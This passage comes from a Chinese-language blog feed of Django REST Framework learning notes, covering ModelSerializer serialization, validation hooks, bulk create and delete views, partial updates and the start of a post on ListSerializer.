class="title">BookModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="comment"># 了解: 1.还可以自定义设置序列化字段，但是必须在fields中声明，在fields中写publish_address</span></span><br><span class="line">    <span class="comment"># publish_address = SerializerMethodField()</span></span><br><span class="line">    <span class="comment"># def get_publish_address(self, obj):</span></span><br><span class="line">    <span class="comment">#     return obj.publish.address</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 自定义连表深度-子序列化方式-该方式不能参与反序列化，使用在序列化和反序列化共存时，不能书写</span></span><br><span class="line">    publish = PublishModelSerializer()</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        <span class="comment"># 序列化类关联的model类</span></span><br><span class="line">        model = models.Book</span><br><span class="line">        <span class="comment"># 参与序列化的字段</span></span><br><span class="line">        fields = (<span class="string">'name'</span>, <span class="string">'price'</span>, <span class="string">'img'</span>, <span class="string">'author_list'</span>, <span class="string">'publish'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 了解知识点</span></span><br><span class="line">        <span class="comment"># 所有字段</span></span><br><span class="line">        <span class="comment"># fields = '__all__'</span></span><br><span class="line">        <span class="comment"># 与fields不共存，exclude排除哪些字段</span></span><br><span class="line">        <span class="comment"># exclude = ('id', 'is_delete', 'create_time')</span></span><br><span class="line">        <span class="comment"># 自动连表深度</span></span><br><span class="line">        <span class="comment"># depth = 1</span></span><br></pre></td></tr></table></figure>
</details>
<h4 id="视图层-views.py">视图层 <code>views.py</code></h4>
<details>
<p><summary> <b><i>Source Code</i></b> </summary></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> models,serializers</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        pk = kwargs.get(<span class="string">'pk'</span>)</span><br><span class="line">        <span class="comment"># 单查</span></span><br><span class="line">        <span class="keyword">if</span> pk:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                book_obj = models.Book.objects.get(pk=pk, is_delete=<span class="literal">False</span>)</span><br><span class="line">                book_data = serializers.BookModelSerializer(</span><br><span class="line">                    book_obj).data  <span class="comment"># 单条数据序列化</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">                <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                    <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">                    <span class="string">'msg'</span>: <span class="string">'数据不存在'</span></span><br><span class="line">                &#125;)</span><br><span class="line">        <span class="comment"># 群查</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            book_query = models.Book.objects.filter(</span><br><span class="line">                is_delete=<span class="literal">False</span>).all()  <span class="comment"># 先筛选查询,再查所有</span></span><br><span class="line">            book_data = serializers.BookModelSerializer(</span><br><span class="line">                book_query, many=<span class="literal">True</span>).data  <span class="comment"># 不管是一条还是多条，只要数据是被[]嵌套，都要写many=True</span></span><br><span class="line">        <span class="comment"># 返回前端数据</span></span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">            <span class="string">'results'</span>: book_data</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure>
</details>
<h4 id="子路由层-apiurls.py">子路由层 <code>api/urls.py</code></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v1/books/'</span>, views.Book.as_view()),</span><br><span class="line">    path(<span class="string">'v1/books/&lt;pk&gt;/'</span>, views.Book.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h3 id="反序列化">反序列化</h3>
<h4 id="序列化层-apiserializers.py-1">序列化层 <code>api/serializers.py</code></h4>
<details>
<p><summary> <b><i>Source Code</i></b> </summary></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookModelDeserializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="comment"># 一些只参与反序列化的字段，但是不是与数据库关联的，自定义不入库的反序列化的字段</span></span><br><span class="line">    <span class="comment"># 自定义字段的 read_only属性必须定义在CharField，不能写在下方的extra_kwargs中，否则会被传入models.Book进行反序列化而报错</span></span><br><span class="line">    re_name = CharField(read_only=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.Book</span><br><span class="line">        exclude = [<span class="string">'is_delete'</span>, <span class="string">'create_time'</span>, <span class="string">'img'</span>]</span><br><span class="line">        <span class="comment"># fields = ('name', 'price', 'publish', 'authors','re_name')  #没有默认值的字段必须序列化，为其传值</span></span><br><span class="line">        <span class="comment"># extra_kwargs 用来完成反序列化字段的 系统校验规则</span></span><br><span class="line">        extra_kwargs = &#123;</span><br><span class="line">            <span class="string">'name'</span>: &#123;</span><br><span class="line">                <span class="string">'required'</span>: <span class="literal">True</span>,  <span class="comment"># 设置name字段必填</span></span><br><span class="line">                <span class="string">'min_length'</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">'error_messages'</span>: &#123;</span><br><span class="line">                    <span class="string">'required'</span>: <span class="string">'必填项'</span>,</span><br><span class="line">                    <span class="string">'min_length'</span>: <span class="string">'太短'</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 局部钩子校验单个字段  validate_字段名</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_name</span><span class="params">(self, value)</span>:</span>  <span class="comment"># value是字段name的值</span></span><br><span class="line">        <span class="comment"># 书名不能包含 g 字符</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'g'</span> <span class="keyword">in</span> value.lower():</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'该g书不能出版'</span>)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">    <span class="comment"># 全局钩子</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate</span><span class="params">(self, attrs)</span>:</span></span><br><span class="line">        publish = attrs.get(<span class="string">'publish'</span>)  <span class="comment"># publish如果是外键字段，这个就是publish对象</span></span><br><span class="line">        name = attrs.get(<span class="string">'name'</span>)</span><br><span class="line">        <span class="keyword">if</span> models.Book.objects.filter(name=name, publish=publish):</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(&#123;<span class="string">'book'</span>: <span class="string">'该书已存在'</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span> attrs</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 注意：ModelSerializer类已经帮我们实现了 create 与 update 方法,不需要写create就能创建</span></span><br></pre></td></tr></table></figure>
</details>
<h4 id="视图层-views.py-1">视图层 <code>views.py</code></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        request_data = request.data</span><br><span class="line">        book_ser = serializers.BookModelDeserializer(data=request_data)</span><br><span class="line">        <span class="comment"># raise_exception=True：当校验失败，马上终止当前视图方法，抛异常返回给前台</span></span><br><span class="line">        book_ser.is_valid(raise_exception=<span class="literal">True</span>)</span><br><span class="line">        book_obj = book_ser.save()</span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">            <span class="string">'results'</span>: serializers.BookModelSerializer(book_obj).data</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure>
<h4 id="子路由层-apiurls.py-1">子路由层 <code>api/urls.py</code></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v1/books/'</span>, views.Book.as_view()),</span><br><span class="line">    path(<span class="string">'v1/books/&lt;pk&gt;/'</span>, views.Book.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<div class="note warning">
            <h4 id="注意点">注意点</h4><ol type="1"><li>反序列化层：<ul><li>在设置<code>fields</code>，没有默认值的字段都必须设置反序列化保存到数据库中</li><li>使用<code>extra_kwargs</code> 来设置系统校验规则</li><li>设置局部钩子和全局钩子</li><li><code>ModelSerializer</code>类已经帮我们实现了 <code>create</code> 与 <code>update</code> 方法，不需要再写</li></ul></li><li>视图层：<ul><li>POST请求通过<code>request.data</code>拿到数据包</li><li>传给反序列化 ,通过<code>data=request_data</code>传入需要反序列化的数据</li><li><code>is_valid</code>判断校验是否合格 ，<code>raise_exception=True</code>必须要写的</li><li>通过<code>.save()</code>保存到数据库中</li></ul></li></ol>
          </div>
<h3 id="序列化与反序列化整合">序列化与反序列化整合</h3>
<h4 id="序列化层-apiserializers.py-2">序列化层 <code>api/serializers.py</code></h4>
<details>
<p><summary> <b><i>Source Code</i></b> </summary></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V2BookModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="comment"># 一些只参与反序列化的字段，但是不是与数据库关联的，自定义不入库的反序列化的字段</span></span><br><span class="line">    re_name = CharField(read_only=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.Book</span><br><span class="line">        fields = (<span class="string">'name'</span>, <span class="string">'price'</span>, <span class="string">'img'</span>, <span class="string">'author_list'</span>,</span><br><span class="line">                  <span class="string">'publish_name'</span>, <span class="string">'publish'</span>, <span class="string">'authors'</span>, <span class="string">'re_name'</span>)</span><br><span class="line">        extra_kwargs = &#123;</span><br><span class="line">            <span class="string">'name'</span>: &#123;</span><br><span class="line">                <span class="string">'required'</span>: <span class="literal">True</span>,</span><br><span class="line">                <span class="string">'min_length'</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">'error_messages'</span>: &#123;</span><br><span class="line">                    <span class="string">'required'</span>: <span class="string">'必填项'</span>,</span><br><span class="line">                    <span class="string">'min_length'</span>: <span class="string">'太短'</span>,</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'publish'</span>: &#123;</span><br><span class="line">                <span class="string">'write_only'</span>: <span class="literal">True</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'authors'</span>: &#123;</span><br><span class="line">                <span class="string">'write_only'</span>: <span class="literal">True</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'img'</span>: &#123;</span><br><span class="line">                <span class="string">'read_only'</span>: <span class="literal">True</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'author_list'</span>: &#123;</span><br><span class="line">                <span class="string">'read_only'</span>: <span class="literal">True</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'publish_name'</span>: &#123;</span><br><span class="line">                <span class="string">'read_only'</span>: <span class="literal">True</span>,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_name</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="comment"># 书名不能包含 g 字符</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'g'</span> <span class="keyword">in</span> value.lower():</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'该g书不能出版'</span>)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate</span><span class="params">(self, attrs)</span>:</span></span><br><span class="line">        publish = attrs.get(<span class="string">'publish'</span>)</span><br><span class="line">        name = attrs.get(<span class="string">'name'</span>)</span><br><span class="line">        <span class="comment"># 视频里使用这种验证方式，实际是不合理的，因为会导致针对价格修改的PUT请求失败(name&amp;publish已存在)</span></span><br><span class="line">        <span class="comment"># 因此在这里将其注释掉 ，正确的方式是在models.Book中对这两个字段的共同唯一性作约束</span></span><br><span class="line">        <span class="comment"># 而本函数通常作为对不同attr的对比验证，如两次输入密码是否一致等</span></span><br><span class="line">        <span class="comment"># if models.Book.objects.filter(name=name, publish=publish):</span></span><br><span class="line">        <span class="comment">#     raise ValidationError(&#123;'book': '该书已存在'&#125;)</span></span><br><span class="line">        <span class="keyword">return</span> attrs</span><br></pre></td></tr></table></figure>
</details>
<div class="note warning">
            <h5 id="注意点">注意点</h5><ol type="1"><li><code>fields</code>中设置所有序列化与反序列化字段</li><li><code>extra_kwargs</code>划分只序列化或只反序列化字段（一般我们把需要存入到数据库中的使用<code>write_only</code>（反序列化）,只需要展示的就read_only(序列化)，看需求设计）<ul><li><code>write_only</code>：只反序列化</li><li><code>read_only</code>：只序列化</li><li>自定义字段默认只序列化(<code>read_only</code>)</li><li>如果字段没设置<code>write_only</code>或者<code>read_only</code>，那么该字段可以序列化和反序列化</li></ul></li><li>设置反序列化所需的 系统、局部钩子、全局钩子 等校验规则</li></ol>
          </div>
<h4 id="视图层-views.py-2">视图层 <code>views.py</code></h4>
<details>
<p><summary> <b><i>Source Code</i></b> </summary></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V2Book</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        pk = kwargs.get(<span class="string">'pk'</span>)</span><br><span class="line">        <span class="comment"># 单查</span></span><br><span class="line">        <span class="keyword">if</span> pk:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                book_obj = models.Book.objects.get(pk=pk, is_delete=<span class="literal">False</span>)</span><br><span class="line">                book_data = serializers.V2BookModelSerializer(</span><br><span class="line">                    book_obj).data  <span class="comment"># 序列化</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                    <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">                    <span class="string">'msg'</span>: <span class="string">'参数有误'</span></span><br><span class="line">                &#125;)</span><br><span class="line">        <span class="comment"># 群查</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            book_query = models.Book.objects.filter(is_delete=<span class="literal">False</span>).all()</span><br><span class="line">            book_data = serializers.V2BookModelSerializer(</span><br><span class="line">                book_query, many=<span class="literal">True</span>).data  <span class="comment"># 序列化</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">            <span class="string">'results'</span>: book_data</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># 单增:传的数据是与model对应的一个字典</span></span><br><span class="line">        <span class="comment"># 群增：设计传递的是多个model对应的字典列表,在postman中通过列表嵌套字典传值</span></span><br><span class="line">        request_data = request.data</span><br><span class="line">        <span class="keyword">if</span> isinstance(request_data, dict):  <span class="comment"># 判断获取的数据是否是dict</span></span><br><span class="line">            many = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> isinstance(request_data, list):  <span class="comment"># 判断获取的数据是否是list</span></span><br><span class="line">            many = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">'msg'</span>: <span class="string">'数据错误'</span></span><br><span class="line">            &#125;)</span><br><span class="line">        book_ser = serializers.V2BookModelSerializer(</span><br><span class="line">            data=request_data, many=many)  <span class="comment"># 反序列化</span></span><br><span class="line">        book_ser.is_valid(raise_exception=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># book_result是对象&lt;class 'app01.models.Book'&gt;，群增就是列表套一个个对象</span></span><br><span class="line">        book_result = book_ser.save()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">            <span class="string">'results'</span>: serializers.V2BookModelSerializer(book_result, many=many).data</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 单删: 有pk   #在postman中通过路径传参</span></span><br><span class="line">    <span class="comment"># 群删：有pks   &#123;"pks": [1, 2, 3]&#125;   #通过json传参</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        pk = kwargs.get(<span class="string">'pk'</span>)</span><br><span class="line">        <span class="keyword">if</span> pk:</span><br><span class="line">            pks = [pk]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pks = request.data.get(<span class="string">'pks'</span>)</span><br><span class="line">        <span class="keyword">if</span> models.Book.objects.filter(pk__in=pks, is_delete=<span class="literal">False</span>).update(is_delete=<span class="literal">True</span>):</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="string">'msg'</span>: <span class="string">'删除成功'</span></span><br><span class="line">            &#125;)</span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'删除失败'</span></span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure>
</details>
<div class="note warning">
            <h5 id="注意点">注意点</h5><ol type="1"><li>序列化数据最后必须要<code>.data</code> （因为要传给前端）</li><li>反序列化通过<code>data</code>传参，序列化通过<code>instance</code>传参（当你只传一个参数时，默认是<code>instance</code>的参数）</li><li>反序列化与序列化都能使用<code>many=True</code>，序列化和反序列化数据只要被[]嵌套都要写<code>many=True</code></li></ol>
          </div>
<h4 id="子路由层-apiurls.py-2">子路由层 <code>api/urls.py</code></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v2/books/'</span>, views.V2Book.as_view()),</span><br><span class="line">    path(<span class="string">'v2/books/&lt;pk&gt;/'</span>, views.V2Book.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h1 id="使用场景总结">使用场景总结</h1>
<p>序列化类初始化时，<code>instance</code>/<code>data</code>/<code>many</code>/<code>partial</code> 是影响序列化对象行为的四个关键参数。</p>
<h2 id="序列化角度">序列化角度</h2>
<h3 id="序列化-1">序列化</h3>
<p>如果没有<code>data</code>参数，只有<code>instance</code>，那么就不存在反序列化校验一说，只有序列化对象<code>instance</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 序列化get （给前端传递参数）  #查询</span></span><br><span class="line">ser_obj = ModelSerializer(model_obj)   <span class="comment">#只传递一个参数，默认是instance的参数，查询数据</span></span><br></pre></td></tr></table></figure>
<h3 id="反序列化-1">反序列化</h3>
<p>如果有<code>data</code>，没有<code>instance</code>，则需要调用<code>is_valid</code>方法校验<code>data</code>，然后将<code>data</code>进行反序列化，得到<code>validated_data</code>，此时再通过序列化对象获取<code>data</code>，这个<code>data</code>和初始化提供的<code>data</code>不同，是序列化<code>validated_data</code>后的<code>data</code>，比起初始化<code>data</code>，可能减少了无效的字段（序列化没有定义的字段）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 反序列化post  save() =&gt; create()（数据保存到数据库中）  #添加</span></span><br><span class="line">ser_obj = ModelSerializer(data=model_data)  <span class="comment">#传递data参数，保存数据</span></span><br></pre></td></tr></table></figure>
<h3 id="数据操作角度增删改查">数据操作角度（增删改查）</h3>
<h2 id="修改场景">修改场景</h2>
<ul>
<li>如果同时提供了<code>instance</code>及<code>data</code>, 那么只要有<code>data</code>或者部分<code>data</code>，<code>data</code>都要进行验证才能进行下面的<code>save</code>等操作，如果不经过<code>is_valid</code>过程，那么后面的获取序列化数据或者反序列化数据都会无效。</li>
<li>要用<code>instance</code>指明要修改的对象<code>partial</code>用于部分更新，之所以要伴随<code>instance</code>，是因为要指明给<code>save</code>用，在<code>save</code>操作时给那个<code>instance</code>部分更新。逻辑这回走到下面源码中的<code>get_initial()</code>获取要进行更新<code>instance</code>的字段数据。</li>
</ul>
<h3 id="单改">单改</h3>
<ol type="1">
<li>单整体改，说明前台要提供修改的数据，修改之后保存的数据需要校验，校验的数据应该在实例化“序列化类对象”时，赋值给<code>data</code></li>
<li>修改，就必须明确被修改的模型类对象，并在实例化“序列化类对象”时，赋值给<code>instance</code>，必须赋值给<code>instance</code></li>
<li>整体修改，所有校验规则有<code>required=True</code>的字段，都必须提供，因为在实例化“序列化类对象”时，参数<code>partial</code>默认为<code>False</code></li>
</ol>
<h4 id="整体改put">整体改(<code>PUT</code>)</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">V2BookModelSerializer(</span><br><span class="line">    instance=model_obj, <span class="comment"># 要被更新的对象</span></span><br><span class="line">    data=model_data, <span class="comment"># 用来更新的数据</span></span><br><span class="line">    partial=<span class="literal">False</span>, <span class="comment"># 默认False，必须的字段全部参与校验</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h4 id="局部改patch">局部改(<code>PATCH</code>)</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">V2BookModelSerializer(</span><br><span class="line">    instance=model_obj, <span class="comment"># 要被更新的对象, </span></span><br><span class="line">    data=model_data, <span class="comment"># 用来更新的数据,</span></span><br><span class="line">    partial=<span class="literal">True</span>, <span class="comment"># 设置True，必须的字段都变为选填字段</span></span><br><span class="line">)</span><br><span class="line">    <span class="comment"># 注：partial设置True的本质就是使字段 required=True 校验规则失效</span></span><br></pre></td></tr></table></figure>
<h2 id="群改-listserializer">群改 <code>ListSerializer</code></h2>
<p><code>many</code>参数将直接影响序列化类的类型，如果是<code>many=False</code>，那么直接使用当前序列化类。如果<code>many=True</code>，将实例化一个<code>ListSerializer</code>类来序列化或者反序列化类。</p>
<p>在前面的代码中，我们在<code>V2BookModelSerializer</code>类中并没有做对多对象序列化的特殊处理，但V2版本的api仍然支持群增和群删操作。究其原因，是由于<code>BaseSerializer.__new__</code>方法）或者<code>class Meta:</code>中定义了<code>list_serializer_class</code>指定的多对象序列化类。</p>
<p>关于 <code>ListSerializer</code>的详细介绍请看下一篇。</p>
<h1 id="给序列化类传入自定义数据">给序列化类传入自定义数据</h1>
<p>视图类<code>views.py</code>使用<code>context</code>传递参数给序列化类<code>serializers.py</code></p>
<h2 id="方法">方法</h2>
<ol type="1">
<li>在视图类中实例化序列化对象时，可以设置<code>context</code>内容</li>
<li>在序列化类中的<code>局部钩子</code>、<code>全局钩子</code>、<code>create</code>、<code>update</code>方法中，都可以用<code>self.context</code>访问视图类传递过来的内容。</li>
</ol>
<h2 id="使用场景">使用场景</h2>
<p>例如有类似如下需求时：</p>
<ul>
<li>在视图类<code>views</code>中，可以通过<code>request</code>得到登陆用户<code>request.user</code></li>
<li>在序列化类中，要完成数据库数据的校验与入库操作，可能会需要知道当前的登陆用户，但序列化类默认无法访问<code>request</code></li>
</ul>
<p>因此在视图类中实例化序列化对象时，将<code>request</code>对象传递进去</p>
<h2 id="示例代码">示例代码</h2>
<h3 id="视图层-views.py-3">视图层 <code>views.py</code></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        book_ser = serializers.BookModelSerializer(data=request_data,context=&#123;<span class="string">'request'</span>:request&#125;)   <span class="comment">#视图层context传递参数</span></span><br><span class="line">        book_ser.is_valid(raise_exception=<span class="literal">True</span>)</span><br><span class="line">        book_result = book_ser.save()</span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">            <span class="string">'results'</span>: serializers.BookModelSerializer(book_result).data</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure>
<h3 id="序列化层-serializers.py">序列化层 <code>serializers.py</code></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.Book</span><br><span class="line">        fields = (<span class="string">'name'</span>, <span class="string">'price'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_name</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        print(self.context.get(<span class="string">'request'</span>).method)  <span class="comment">#序列化层接收参数</span></span><br><span class="line">        <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure>
<h1 id="扩展阅读">扩展阅读</h1>
<p><span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uaW0vcG9zdC81YTY4OTM0NTUxODgyNTczNDQzY2RkZjg=">django rest framework serializers小结<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Learning Notes</tag>
        <tag>Tech</tag>
        <tag>Dev</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST Framework</tag>
        <tag>DRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（九）：序列化模块 serialziers 之 ListSerializer类</title>
    <url>/tech/drf-learning-notes-9-the-listserializer-class-in-serialziers-module/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (8): the ModelSerializer class in serialziers module</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<h1 id="基本信息">基本信息</h1>
<ul>
<li>源码：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvc2VyaWFsaXplcnMucHk=">rest_framework.serializers<i class="fa fa-external-link-alt"></i></span></li>
<li>官方文档
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvc2VyaWFsaXplcnMv">API Guild - Serializers<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvZmllbGRzLw==">API Guild - Serializer fields<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVsYXRpb25zLw==">API Guild - Serializer relations<i class="fa fa-external-link-alt"></i></span></li>
</ul></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzlfZHJmX0xpc3RTZXJpYWxpemVy">本文demo代码Github<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>DRF常用序列化类主要有</p>
<ul>
<li><code>rest_framework.serialziers.Serializer</code></li>
<li><code>rest_framework.serialziers.ModelSerializer</code></li>
<li><code>rest_framework.serialziers.ListSerializer</code></li>
</ul>
<p>本篇介绍<code>rest_framework.serialziers.ListSerializer</code>，将继续以图书管理系统实例说明。</p>
<a id="more"></a>
<h1 id="使用场景之群改群增群改">使用场景之群改群增群改</h1>
<p>当一个序列化器在带有<code>many=True</code>选项被序列化时，将创建一个<code>ListSerializer</code>实例，该序列化器类将成为<code>ListSerializer</code>类的子类。 当你需要自定义多个对象的行为时（比如群增，群改）,你需要手动定制<code>ListSerializer</code>类的一些行为。 可以通过在自定义序列化器的<code>Meta</code>类下面的<code>list_serializer_class</code>来绑定你需要的的<code>ListSerializer</code>类</p>
<h1 id="示例代码">示例代码</h1>
<p>群改需要设置<code>ListSerializer</code>，创建<code>BookListSerializer</code>继承<code>ListSerializer</code>，重写<code>update</code>方法</p>
<h2 id="序列化层-serializer.py">序列化层 <code>serializer.py</code></h2>
